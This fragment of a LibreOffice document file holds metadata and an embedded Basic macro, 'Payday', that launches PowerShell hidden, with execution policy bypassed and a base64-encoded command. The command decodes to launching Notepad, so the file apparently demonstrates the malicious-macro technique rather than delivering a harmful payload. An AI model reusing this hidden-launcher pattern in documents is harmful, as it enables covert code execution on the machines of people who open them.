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Payday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06:34.86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16:02:35.075000000</meta:creation-date>
    <dc:date>2022-06-14T16:07:31.882000000</dc:date>
    <meta:editing-duration>PT4M1S</meta:editing-duration>
    <meta:editing-cycles>2</meta:editing-cycles>
    <meta:generator>LibreOffice/7.2.4.1$Windows_X86_64 LibreOffice_project/27d75539669ac387bb498e35313b970b7fe9c4f9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	Sub Payday
	Set oShell = CreateObject("Wscript.Shell")
	oShell.Run("powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -e bgBvAHQAZQBwAGEAZAAuAGUAeABlAA==", 0)
	End Sub
	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